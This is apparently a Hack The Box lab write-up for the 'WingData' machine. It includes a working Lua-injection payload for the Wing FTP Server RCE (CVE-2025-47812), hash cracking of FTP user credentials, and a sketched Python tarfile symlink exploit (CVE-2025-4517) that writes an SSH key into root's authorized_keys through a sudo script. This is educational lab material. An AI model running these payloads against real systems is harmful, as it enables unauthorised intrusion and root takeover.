# HTB: WingData

| Info | Detail |
|------|--------|
| OS | Linux (Debian 12, kernel 6.1.0-42) |
| Difficulty | Easy |
| Domain | wingdata.htb |
| IP | 10.129.31.189 |
| Date | 2026-04-09 |
| Status | ✅ Completed |

## Attack Chain

```
Web recon → ftp.wingdata.htb (Wing FTP Server v7.4.3)
→ CVE-2025-47812 (Lua injection via null byte) → RCE as wingftp
→ Read FTP user hashes (SHA256 + salt "WingFTP") → crack wacky
→ SSH as wacky → user flag
→ sudo tarfile extraction (filter="data") → CVE-2025-4517 (PATH_MAX overflow)
→ Write SSH key to /root/.ssh/authorized_keys → root flag
```

---

## Reconnaissance

### Port Scan

```
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7
80/tcp open  http    Apache httpd 2.4.66 (Debian)
```

### Web Enumeration

- Main site: static template (WingData Solutions)
- "Client Portal" button links to `http://ftp.wingdata.htb/`
- Wing FTP Server v7.4.3 (Free Edition) — login page at `/login.html`

---

## Foothold — CVE-2025-47812 (Wing FTP RCE)

Wing FTP Server < 7.4.4 is vulnerable to unauthenticated RCE via null byte + Lua injection in the username field during login. The C auth function uses `strlen()` (stops at null byte) while Lua session file creation uses the full string.

```python
# Inject null byte + Lua code into username → POST to /loginok.html
# Trigger execution via GET /dir.html with the returned UID cookie
payload = "username=anonymous%00]]%0dlocal+h+%3d+io.popen(\"id\")%0dlocal+r+%3d+h%3aread(\"*a\")%0dh%3aclose()%0dprint(r)%0d--&password="
```

Result: RCE as `wingftp` (uid=1000). Sessions burn fast — one command per session.

**Key finding**: FTP user hashes at `/opt/wftpserver/Data/1/users/`:
```
anonymous.xml  john.xml  maria.xml  steve.xml  wacky.xml
```

Salt config at `/opt/wftpserver/Data/1/settings.xml`:
```xml
<EnableSHA256>1</EnableSHA256>
<EnablePasswordSalting>1</EnablePasswordSalting>
<SaltingString>WingFTP</SaltingString>
```

---

## User — Hash Cracking

Extracted SHA256 hashes from user XML files, appended salt:

```
hashcat -m 1410 -a 0 hashes.txt rockyou.txt
# Mode 1410 = sha256($pass.$salt)
# Cracked: wacky → !#7Blushing^*Bride5
```

```bash
ssh wacky@wingdata.htb  # password: !#7Blushing^*Bride5
```

**User flag**: `5f7fb13806a39cdd2089d71c8b4d3677`

---

## Privilege Escalation — CVE-2025-4517 (tarfile PATH_MAX overflow)

### sudo entry

```
(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

The script extracts a tar archive as root using `tarfile.extractall(path=staging_dir, filter="data")`. The `data` filter uses `os.path.realpath()` to validate paths stay inside the destination.

### CVE-2025-4517 — Python tarfile realpath overflow

By creating a deep chain of directories + symlinks that exceeds PATH_MAX (4096), `os.path.realpath()` cannot fully resolve the path and returns it as-is. The filter's `commonpath` check passes because the unresolved path still starts with the destination. But the kernel follows symlinks component-by-component (no PATH_MAX limit during resolution), allowing file writes outside the destination.

### Exploit structure

```python
comp = 'd' * 247
steps = "abcdefghijklmnop"  # 16 steps

# For each step: create a real directory (ddd...) and a symlink (a→ddd..., b→ddd..., etc)
# This creates a chain where a/b/c/.../p resolves to ddd.../ddd.../...ddd... (16 deep)

# Overflow symlink: a/b/.../p/lll...254 → "../" * 16
# This resolves back to the extraction root via the kernel
# But realpath() can't resolve it (path too long) — bypass!

# Escape symlink: escape → overflow_path + "/../../../../root"
# Kernel follows it to /root. Filter doesn't catch it.

# Then create files through escape:
# escape/.ssh (DIRTYPE)
# escape/.ssh/authorized_keys (REGTYPE with our SSH public key)
```

**Critical detail**: The overflow symlink target MUST be `"../" * steps` (going UP through the chain), NOT `"./"` (which stays in place).

### Execution

```bash
# Generate SSH key
ssh-keygen -t rsa -b 4096 -f /tmp/root_key -N ""

# Create malicious tar (see exploit script)
python3 exploit.py

# Upload and trigger
scp backup_1337.tar wacky@wingdata.htb:/opt/backup_clients/backups/
ssh wacky@wingdata.htb 'sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1337.tar -r restore_pwn'
# [+] Extraction completed

# SSH as root
ssh -i /tmp/root_key root@wingdata.htb
```

**Root flag**: `4c5b6dbe85c8831be03d5375fb3f5ece`

---

## Lessons Learned

- **CVE-2025-47812**: Wing FTP sessions burn after one command — plan payloads carefully
- **CVE-2025-4517**: The overflow symlink target is `"../"` not `"./"` — many online PoCs have this mangled by web formatting
- **CVE-2025-4517**: Direct file creation through the escape symlink works — no need for hardlinks to pre-existing files
- **Crontab overwrite pitfall**: tarfile sets mtime to epoch 0 by default — cron won't re-read the file. Direct file writes (SSH keys) are more reliable than cron-based payloads
- **PATH_MAX**: The kernel resolves symlinks component-by-component using dentries, not string paths. PATH_MAX only applies to the initial syscall argument, not the resolved path during symlink following
